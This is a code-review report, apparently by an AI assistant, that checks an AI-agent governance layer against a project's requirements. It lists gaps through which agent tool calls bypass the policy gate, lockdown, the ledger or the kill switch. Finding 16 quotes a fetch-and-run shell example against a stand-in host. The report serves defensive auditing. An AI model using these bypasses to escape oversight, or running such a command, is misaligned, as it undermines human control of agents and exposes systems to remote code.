# Kimi QA Report 1: Governance Layer vs. GradProj_Current.pdf

**Scope:** Read-only comparison of the code in `C:/Users/kinan/openclaw` against the design/requirements in `Documentation/GradProj/Grad_Proj___Current.pdf`.
**No files were modified.**

---

## 1. What the PDF asks for

The report’s design requirements (§1.3) are:

| #   | Requirement                                                                     |
| --- | ------------------------------------------------------------------------------- |
| 1   | Node.js 18+ / TypeScript                                                        |
| 2   | Secure web dashboard for policies, active-session monitoring, RBAC              |
| 3   | Default-deny policy model for paths, commands, network                          |
| 4   | Fine-grained privileges: path access, command allowlist, network allowlist, TTL |
| 5   | Record 100% of agent actions, policy decisions, administrative approvals        |
| 6   | Tamper-evident audit logging                                                    |
| 7   | Real-time suspend/terminate agent sessions within 1 second                      |
| 8   | No plaintext secrets in logs                                                    |
| 9   | Linux deployment with open-source components only                               |

The preliminary design (§1.6) also calls for:

- Four-tier RBAC: Root, Administrator, User, Viewer
- HITL “Ask on Miss” with a Root-configurable timeout, stored in a stack
- HITL toggled **by Administrator per-agent** and **by Root per-user**
- Sub-second kill switch using SIGTERM→SIGKILL and process-tree cleanup
- Earlier rules take precedence; conflicts are notified

---

## 2. Requirements trace

| Requirement           | Verdict                              | Notes                                                                                                                                                                                                                                                                             |
| --------------------- | ------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1 Node/TS             | **Partially differs**                | Uses Node 22.22.3+/24+/25.9+ (per `AGENTS.md`), not 18+.                                                                                                                                                                                                                          |
| 2 Dashboard + RBAC    | **Implemented**                      | `ui/src/pages/governance/governance-page.ts`, `src/gateway/governance-dashboard-auth.ts`, `src/governance/permissions.ts`.                                                                                                                                                        |
| 3 Default-deny        | **Implemented for enforced posture** | `src/governance/policy-engine.ts:181-215`. Default install starts in `monitor`, so it does **not** block until an admin flips the switch.                                                                                                                                         |
| 4 Fine-grained / TTL  | **Implemented**                      | `PolicyRule.expiresAt`, `pruneExpiredRules`, `resolveRuleTtl`.                                                                                                                                                                                                                    |
| 5 Record 100%         | **Gaps**                             | Tool calls that reach the hook are recorded, but (a) native-harness sessions can bypass the hook entirely, (b) loop-detector blocks are not logged, and (c) **administrative actions** (add/remove rules, mode changes, user CRUD) are not appended to the tamper-evident ledger. |
| 6 Tamper-evident      | **Partial**                          | Hash chain detects interior edits/deletions (`src/governance/audit-ledger.ts`). No external anchor, so tail truncation and full re-hashing are not detectable.                                                                                                                    |
| 7 Kill switch ≤1s     | **Partial**                          | Lockdown is fast; in-flight termination dispatches `AbortController` / process-tree signals, but the 1-second measurement is **dispatch time**, not actual process exit.                                                                                                          |
| 8 Secret redaction    | **Implemented**                      | `redactToolPayloadText` applied before ledger append (`audit-ledger.ts:278`).                                                                                                                                                                                                     |
| 9 Linux / open-source | **Implemented**                      | No proprietary dependencies observed.                                                                                                                                                                                                                                             |

---

## 3. Significant deviations from the report

1. **Default posture is `monitor`, not `enforce`.**
   `src/governance/policy-types.ts:122-132` and the rationale in `docs-notes/QA-IN-PLAIN-TERMS.md:72-89`. The report calls the model “default-deny”; the code records deny verdicts but lets actions through until an operator switches to `enforce`.

2. **Per-user HITL toggle is missing.**
   The report says Root should toggle HITL per-user. The code only has installation-wide `ask` and per-agent `agentAsk` (`policy-types.ts:69`, `src/gateway/governance-dashboard-api.ts:462-498`). There is no per-user override.

3. **Root’s VPS/deployment oversight is not implemented.**
   `docs-notes/ROLE-MODEL.md:63-65` explicitly notes this is future work.

4. **User tier meaning differs.**
   The report says Users “interact with” agents. The implemented User tier manages an agent’s policy/rules/kill switch, not chat interaction (`ROLE-MODEL.md:215-279`).

5. **CLI bypasses RBAC.**
   `docs-notes/CLI-REFERENCE.md:70-77` documents that the CLI performs no role check because it is OS-level. This is fine as a design decision, but it means administrative actions from the CLI are only attributed as actor `cli`, not a named RBAC account.

---

## 4. Bugs and weaknesses found

### Critical / high severity

1. **Native harness can skip the gate entirely.**
   `src/agents/agent-tools.before-tool-call.policy.ts:88-91` defines `hasBeforeToolCallPolicy()` as counting only plugin hooks and trusted policies. `src/agents/harness/native-hook-relay-events.ts:64` uses it to decide whether to relay `pre_tool_use`. On a plugin-free install with the app-server backend, the relay is skipped, so Codex/native-harness sessions run tools without governance, ledger, or kill switch. This is a documented unresolved gap (`gate-attachment.test.ts:103-116` pins the wrong answer).

2. **Administrative actions are not written to the tamper-evident ledger.**
   Grep shows `appendLedgerEntry` is called only from `policy-engine.ts` and `kill-switch.ts`. Adding/removing rules, changing mode/ask, creating/deleting users, role changes, and rule-request approvals write to `policy.json`/`users.json` but never to `audit-ledger.jsonl`. This directly undermines requirement #5 (“record administrative approvals”) and weakens requirement #6.

3. **Kill-switch “1 second” claim measures dispatch, not termination.**
   `src/governance/kill-switch.ts:35-57` measures wall time of `lockAgent()` + `terminateAgentRuns()`. `src/gateway/governance-agent-termination.ts:45-62` calls `abortChatRunById`, which fires an `AbortController` and process-tree termination. On Windows the code uses `taskkill` with a 5-second timeout (`src/process/exec-termination.ts:6, 61-88`); on POSIX it sends signals and waits a grace period. The function returns after signalling, not after the process tree has exited, so the actual termination may exceed 1 s.

4. **Locked agent without `agentId` in context is not blocked.**
   `src/governance/policy-engine.ts:101` only checks lockdown when `ctx.agentId` is present. The termination path recovers the id from the session key (`src/gateway/governance-agent-termination.ts:28-36`), but the policy gate does not, so a tool call whose context lacks `agentId` slips past lockdown.

### Medium severity

5. **Time-of-check/time-of-use in rule authoring.**
   `src/gateway/governance-dashboard-api.ts:556-562` calls `detectRuleConflicts(await loadPolicy(), …)` and then `addRule(...)`, which takes the file lock. Another writer can add a rule between the two, so a conflict warning may be missed or a duplicate created. Same shape for rule-request approval (`src/gateway/governance-dashboard-api.ts:381-413`).

6. **Pending-decision store grows without bound for pending entries.**
   `src/governance/pending-decisions.ts:62-71` prunes only decided entries. If an agent keeps timing out, pending decisions accumulate indefinitely (`MAX_STORED_PENDING_DECISIONS` only bounds decided ones).

7. **Catch-all detector is incomplete.**
   `src/governance/rule-conflicts.ts:59` only knows seven fixed patterns (`.*`, `^.*$`, etc.). It misses `^` and `.+`, which can also match every realistic resource, so an admin can allow everything without a warning.

8. **Conflict detector does not warn when access is silently extended.**
   `src/governance/rule-conflicts.ts:122-170` reports when an existing rule already covers a new rule, but does **not** warn when an identical earlier rule is time-limited and the new rule is indefinite. The new rule extends access, but the operator receives no notice.

9. **Per-agent HITL override is allowed for User tier.**
   The report says this toggle is Administrator/Root. The API route `policy/agent-ask` requires only `user` (`src/gateway/governance-dashboard-api.ts:464-465`).

10. **HITL `allow-always` becomes global when `agentId` is missing from context.**
    `src/governance/policy-engine.ts:268-279` scopes the new rule to `ctx.agentId` only if present; otherwise it creates a global rule.

11. **Cross-process lock can time out before a stale lock is reaped.**
    `src/governance/file-lock.ts:19-21`: lock deadline is 30 s, stale threshold is 60 s. A process that died holding the lock will cause waiters to time out before the stale reaper removes it.

12. **Dashboard usability / safety issues.**
    - No confirmation dialogs for delete user, remove rule, kill switch, or role change (`ui/src/pages/governance/governance-page.ts`).
    - Data is fetched once and never auto-refreshed, so “no sessions running” can be stale.
    - Login form does not submit on Enter.
    - A 401/session expiry during use leaves stale data on screen.
      These are listed as known leftovers in `docs-notes/QA-IN-PLAIN-TERMS.md:395-408`.

### Low severity

13. **Password hashes do not encode scrypt cost parameters.**
    `src/governance/password.ts:16-20` stores `scrypt:<salt>:<hash>`. There is no way to raise the cost factor without locking out existing accounts.

14. **Rule patterns are recompiled on every governed tool call.**
    `src/governance/policy-engine.ts:183` calls `matchesPattern(rule.pattern, resource)` per rule per resource. No compiled cache; performance degrades linearly with rule count.

15. **Path resources are not canonicalized or symlink-hardened.**
    `src/governance/resource-extraction.ts:42-44` only normalizes backslashes. Relative traversal and malicious symlinks are not mitigated, contrary to the report’s background discussion on sandbox escape.

16. **Unanchored regex patterns are easy to misuse.**
    `src/governance/pattern-match.ts` / `rule-validation.ts` accept any valid regex. A rule like `ls` matches `curl evil.sh | bash; ls`. The docs warn about anchoring, but the UI does not enforce it.

---

## 5. What is solid

- The policy engine enforces default-deny, lockdown-before-rules, and records every resource of multi-resource calls (`policy-engine.ts:101-203`).
- Rules can be agent-scoped, so delegation does not become privilege escalation.
- The audit ledger uses SHA-256 chaining, cross-process locking, rotation, and redaction.
- RBAC is implemented with tier + scope checks, account guards, session revocation on role/assignment changes, and brute-force throttling with decoy hashes.
- The kill switch locks first and aborts second, which is the correct ordering.
- File permissions (`0o700` dir, `0o600` files) and test sandboxing are in place.

---

## 6. Summary verdict

The code implements the bulk of the governance layer described in the report: RBAC, default-deny policy engine, HITL escalation, tamper-evident ledger, TTL rules, and a kill switch. However, it has **meaningful gaps relative to the report**:

- **Requirement #3** is softened because fresh installs start in `monitor`.
- **Requirement #5** is incomplete because administrative actions are not in the ledger and some agent paths can bypass the hook.
- **Requirement #6** is incomplete without an external anchor.
- **Requirement #7** is only partially proven because the 1-second measurement does not wait for actual process termination.

The most important unresolved bug is the **native-harness bypass**: in the plugin-free configuration the report’s central security control can be skipped entirely. The second is that **the ledger does not record who changed policy or accounts**, which is exactly the kind of administrative accountability the report requires.

No code was changed.

---

## 7. Monitor mode vs. the report’s requirements

It is **not a direct contradiction** of the appendix/requirements, but it is a **noticeable deviation** from the strict “default-deny / restrict access” framing in Chapter 1. Whether it is acceptable depends on how the report itself is worded.

### Why it does not flatly contradict the appendix

The appendix (Offering Template) repeats requirement **#5**:

> “The system shall continuously monitor autonomous agent activities and shall record 100% of agent actions, policy decisions, and administrative approvals in an auditable logging system.”

`monitor` mode does exactly that: it runs the full policy engine, reaches a real verdict (`allow` / `deny` / `ask`), and writes that verdict to the ledger. It just does **not act on the block**. In that narrow sense, `monitor` is the posture that best satisfies the “continuously monitor and record 100%” requirement, because nothing is suppressed and the log shows what `enforce` would have blocked.

### Why it creates tension with Chapter 1

Chapter 1 states the objective:

> “Establish a ‘Default-Deny’ Security Posture: … all agent permissions and system access rights are disabled by default.”

And requirement **#3**:

> “The system shall enforce a default-deny, policy-based security model that **restricts** autonomous agent access to operating system resources…”

`monitor` mode does **not restrict** access. The policy still _decides_ “deny,” but the action is allowed to proceed. So while the **policy semantics** remain default-deny, the **runtime behavior** is default-allow until the operator flips the switch. That is a meaningful gap between the report’s wording and the shipped default.

### Does it make sense?

Yes, from an engineering standpoint it makes sense, and the project documents that well:

- You cannot write a good allowlist without first observing what the agent legitimately does (`docs-notes/QA-IN-PLAIN-TERMS.md:72-89`).
- Starting in `enforce` with **zero rules** bricks the agent immediately, which in practice causes users to disable the layer entirely (`src/governance/policy-types.ts:95-120`).
- The dashboard prominently shows the current posture, and switching to `enforce` is one toggle.

So it is a **defensible deployment decision**, but it is **not described in the report**. The report talks about the system as if it enforces default-deny from the start, with no “learning phase.” Because of that, an examiner reading Chapter 1 and then looking at the code could reasonably mark it as a deviation.

### Bottom line

- **Not a contradiction** of requirement #5 / the appendix monitoring requirement.
- **A softening** of requirement #3 and the “Default-Deny Security Posture” objective in Chapter 1.
- **Engineering justification exists**, but it needs to be stated explicitly in the report as a design decision, not left as an undocumented implementation choice.
